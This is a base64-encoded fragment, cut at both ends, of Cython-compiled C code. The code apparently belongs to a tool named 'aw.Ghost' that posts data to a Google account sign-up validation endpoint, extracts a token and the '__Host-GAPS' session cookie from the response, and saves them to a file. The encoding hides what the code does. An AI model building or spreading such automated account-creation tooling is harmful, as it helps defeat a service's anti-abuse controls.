wtPl9fcHl4X2twX3VfZl9yZXEsIF9fcHl4X3RfMTMpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTU4LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTMpOyBfX3B5eF90XzEzID0gMDsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RldmljZWluZm8sIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfbnVsbF9udWxsX251bGxfbnVsbF9udWxsX05MX251bCkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNTgsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX3B5eF92X2RhdGEgPSAoKFB5T2JqZWN0KilfX3B5eF90XzQpOwogICAgICBfX3B5eF90XzQgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfMTMgPSBOVUxMOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxNjIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF8xMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Bvc3QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxNjIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3Rjb25mKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDE2MiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgX19weXhfdF84ID0gX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nb29nbGVfYWNjb3VudHNfdXJsKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzgpKSBfX1BZWF9FUlIoMCwgMTYyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9QeU9iamVjdF9Gb3JtYXRTaW1wbGUoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9lbXB0eV91bmljb2RlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDE2MiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzExKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5VW5pY29kZV9Db25jYXRJblBsYWNlKF9fcHl4X3RfMTEsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3Vfc2lnbnVwX3ZhbGlkYXRlcGVyc29uYWxkZXRhaWwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxNjIsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzkgPSAxOwogICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzUpKSkgewogICAgICAgIF9fcHl4X3RfMTMgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpOwogICAgICAgIGFzc2VydChfX3B5eF90XzEzKTsKICAgICAgICBQeU9iamVjdCogX19weXhfX2Z1bmN0aW9uID0gUHlNZXRob2RfR0VUX0ZVTkNUSU9OKF9fcHl4X3RfNSk7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTMpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF81LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fcHl4X3RfOSA9IDA7CiAgICAgIH0KICAgICAgI2VuZGlmCiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMiArICgoQ1lUSE9OX1ZFQ1RPUkNBTEwpID8gMyA6IDApXSA9IHtfX3B5eF90XzEzLCBfX3B5eF90Xzh9OwogICAgICAgIF9fcHl4X3RfMTEgPSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKDMpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMTYyLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7CiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29va2llcywgX19weXhfdl9jb29raWVzLCBfX3B5eF90XzExLCBfX3B5eF9jYWxsYXJncysyLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE2MiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfdl9oZWFkZXJzMiwgX19weXhfdF8xMSwgX19weXhfY2FsbGFyZ3MrMiwgMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjIsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGEsIF9fcHl4X3ZfZGF0YSwgX19weXhfdF8xMSwgX19weXhfY2FsbGFyZ3MrMiwgMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxNjIsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X09iamVjdF9WZWN0b3JjYWxsX0NhbGxGcm9tQnVpbGRlcihfX3B5eF90XzUsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDItX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF8xMSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxNjIsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICB9CiAgICAgIF9fcHl4X3ZfcmVzcG9uc2UgPSBfX3B5eF90XzQ7CiAgICAgIF9fcHl4X3RfNCA9IDA7CgogICAgICAKICAgICAgX19weXhfdF8xMSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9yZXNwb25zZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RleHQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTEpKSBfX1BZWF9FUlIoMCwgMTY0LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpOwogICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfMTEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxNjQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgX19weXhfdF8xMSA9IFB5VW5pY29kZV9TcGxpdCgoKFB5T2JqZWN0KilfX3B5eF90XzgpLCBfX1B5eF9Ob25lQXNOdWxsKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfbnVsbCksIC0xTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxNjQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICBfX3B5eF90XzggPSBfX1B5eF9HZXRJdGVtSW50X0xpc3QoX19weXhfdF8xMSwgMSwgbG9uZywgMSwgX19QeXhfUHlMb25nX0Zyb21fbG9uZywgMSwgMCwgMSwgMSk7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDE2NCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICBfX3B5eF90XzUgPSBfX3B5eF90Xzg7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICBfX3B5eF90XzkgPSAwOwogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTF9OwogICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGxpdCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMi1fX3B5eF90XzkpIHwgKDEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzgpOyBfX3B5eF90XzggPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF80KSkgX19QWVhfRVJSKDAsIDE2NCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIH0KICAgICAgX19weXhfdF84ID0gX19QeXhfR2V0SXRlbUludChfX3B5eF90XzQsIDAsIGxvbmcsIDEsIF9fUHl4X1B5TG9uZ19Gcm9tX2xvbmcsIDAsIDAsIDEsIDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxNjQsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgIF9fcHl4X3ZfdG9rZW5fbGluZSA9IF9fcHl4X3RfODsKICAgICAgX19weXhfdF84ID0gMDsKCiAgICAgIAogICAgICBfX3B5eF90XzEzID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3Jlc3BvbnNlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY29va2llcyk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMykpIF9fUFlYX0VSUigwLCAxNjUsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMyk7CiAgICAgIF9fcHl4X3RfMTEgPSBfX3B5eF90XzEzOwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF8xMSk7CiAgICAgIF9fcHl4X3RfOSA9IDA7CiAgICAgIHsKICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF8xMSwgTlVMTH07CiAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dldF9kaWN0LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgxLV9fcHl4X3RfOSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwOwogICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE2NSwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7CiAgICAgIH0KICAgICAgX19weXhfdF80ID0gX19weXhfdF81OwogICAgICBfX1B5eF9JTkNSRUYoX19weXhfdF80KTsKICAgICAgX19weXhfdF85ID0gMDsKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfSG9zdF9HQVBTLCBfX3B5eF92X2hvc3R9OwogICAgICAgIF9fcHl4X3RfOCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZXQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDMtX19weXhfdF85KSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxNjUsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICB9CiAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdl9ob3N0LCBfX3B5eF90XzgpOwogICAgICBfX3B5eF90XzggPSAwOwoKICAgICAgCiAgICAgICB7CiAgICAgICAgX19weXhfdF81ID0gTlVMTDsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9vcGVuKTsKICAgICAgICBfX3B5eF90XzQgPSBfX3B5eF9idWlsdGluX29wZW47IAogICAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X0dob3N0Y29uZik7IGlmICh1bmxpa2VseSghX19weXhfdF8xMykpIF9fUFlYX0VSUigwLCAxNjYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEzKTsKICAgICAgICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfRGljdF9HZXRJdGVtKF9fcHl4X3RfMTMsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90b2tlbl9maWxlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzExKSkgX19QWVhfRVJSKDAsIDE2NiwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTEpOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7CiAgICAgICAgX19weXhfdF85ID0gMTsKICAgICAgICB7CiAgICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbM10gPSB7X19weXhfdF81LCBfX3B5eF90XzExLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfd307CiAgICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbChfX3B5eF90XzQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfOSwgKDMtX19weXhfdF85KSB8IChfX3B5eF90XzkqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAxNjYsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOCk7CiAgICAgICAgfQogICAgICAgIF9fcHl4X3RfMTQgPSBfX1B5eF9QeU9iamVjdF9Mb29rdXBTcGVjaWFsKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2V4aXQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTQpKSBfX1BZWF9FUlIoMCwgMTY2LCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNCk7CiAgICAgICAgX19weXhfdF8xMSA9IE5VTEw7CiAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfTG9va3VwU3BlY2lhbChfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9lbnRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDE2NiwgX19weXhfTDEwX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICAgIF9fcHl4X3RfOSA9IDE7CiAgICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EUwogICAgICAgIGlmIChsaWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF81KSkpIHsKICAgICAgICAgIF9fcHl4X3RfMTEgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzUpOwogICAgICAgICAgYXNzZXJ0KF9fcHl4X3RfMTEpOwogICAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzUpOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfMTEpOwogICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X19mdW5jdGlvbik7CiAgICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfNSwgX19weXhfX2Z1bmN0aW9uKTsKICAgICAgICAgIF9fcHl4X3RfOSA9IDA7CiAgICAgICAgfQogICAgICAgICNlbmRpZgogICAgICAgIHsKICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzExLCBOVUxMfTsKICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF85LCAoMS1fX3B5eF90XzkpIHwgKF9fcHl4X3RfOSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxNjYsIF9fcHl4X0wxMF9lcnJvcikKICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICAgIH0KICAgICAgICBfX3B5eF90XzUgPSBfX3B5eF90XzQ7CiAgICAgICAgX19weXhfdF80ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICAgewogICAgICAgICAgewogICAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgICAgICAgICAgX19QeXhfUHlUaHJlYWRTdGF0ZV9hc3NpZ24KICAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uU2F2ZSgmX19weXhfdF8xNSwgJl9fcHl4X3RfMTYsICZfX3B5eF90XzE3KTsKICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE1KTsKICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE2KTsKICAgICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE3KTsKICAgICAgICAgICAgIHsKICAgICAgICAgICAgICBfX3B5eF92X2YgPSBfX3B5eF90XzU7CiAgICAgICAgICAgICAgX19weXhfdF81ID0gMDsKCiAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgX19weXhfdF84ID0gX19weXhfdl9mOwogICAgICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzgpOwogICAgICAgICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zvcm1hdFNpbXBsZShfX3B5eF92X3Rva2VuX2xpbmUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2VtcHR5X3VuaWNvZGUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wxNF9lcnJvcikKICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF80KTsKICAgICAgICAgICAgICBfX3B5eF90XzExID0gX19QeXhfUHlPYmplY3RfRm9ybWF0U2ltcGxlKF9fcHl4X3ZfaG9zdCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZW1wdHlfdW5pY29kZSk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMSkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wxNF9lcnJvcikKICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMSk7CiAgICAgICAgICAgICAgX19weXhfdF8xOFswXSA9IF9fcHl4X3RfNDsKICAgICAgICAgICAgICBfX3B5eF90XzE4WzFdID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fMTI7CiAgICAgICAgICAgICAgX19weXhfdF8xOFsyXSA9IF9fcHl4X3RfMTE7CiAgICAgICAgICAgICAgX19weXhfdF8xOFszXSA9IF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfXzEzOwogICAgICAgICAgICAgIF9fcHl4X3RfMTMgPSBfX1B5eF9QeVVuaWNvZGVfSm9pbihfX3B5eF90XzE4LCA0LCBfX1B5eF9QeVVuaWNvZGVfR0VUX0xFTkdUSChfX3B5eF90XzQpICsgMiArIF9fUHl4X1B5VW5pY29kZV9HRVRfTEVOR1RIKF9fcHl4X3RfMTEpICsgMSwgMTI3IHwgX19QeXhfUHlVbmljb2RlX01BWF9DSEFSX1ZBTFVFKF9fcHl4X3RfNCkgfCBfX1B5eF9QeVVuaWNvZGVfTUFYX0NIQVJfVkFMVUUoX19weXhfdF8xMSkpOwogICAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMykpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wxNF9lcnJvcikKICAgICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMyk7CiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTEpOyBfX3B5eF90XzExID0gMDsKICAgICAgICAgICAgICBfX3B5eF90XzkgPSAwOwogICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzgsIF9fcHl4X3RfMTN9OwogICAgICAgICAgICAgICAgX19weXhfdF81ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGxNZXRob2QoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3dyaXRlLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzksICgyLV9fcHl4X3RfOSkgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgICAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICAgICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEzKTsgX19weXhfdF8xMyA9IDA7CiAgICAgICAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAxNjcsIF9fcHl4X0wxNF9lcnJvcikKICAgICAgICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogICAgICAgICAgICAgIH0KICAgICAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKCiAgICAgICAgICAgICAgCiAgICAgICAgICAgIH0KICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzE1KTsgX19weXhfdF8xNSA9IDA7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xNik7IF9fcHl4X3RfMTYgPSAwOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTcpOyBfX3B5eF90XzE3ID0gMDsKICAgICAgICAgICAgZ290byBfX3B5eF9MMTlfdHJ5X2VuZDsKICAgICAgICAgICAgX19weXhfTDE0X2Vycm9yOjsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzExKTsgX19weXhfdF8xMSA9IDA7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMyk7IF9fcHl4X3RfMTMgPSAwOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNCk7IF9fcHl4X3RfNCA9IDA7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgICAgICAgICAgIHsKICAgICAgICAgICAgICBfX1B5eF9BZGRUcmFjZWJhY2soImF3Lkdob3N0IiwgX19weXhfY2xpbmVubywgX19weXhfbGluZW5vLCBfX3B5eF9maWxlbmFtZSk7CiAgICAgICAgICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF81LCAmX19weXhfdF8xMywgJl9fcHl4X3RfOCkgPCAwKSBfX1BZWF9FUlIoMCwgMTY2LCBfX3B5eF9MMTZfZXhjZXB0X2Vycm9yKQogICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTsKICAgICAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTMpOwogICAgICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF84KTsKICAgICAgICAgICAgICBfX3B5eF90XzExID0gUHlUdXBsZV9QY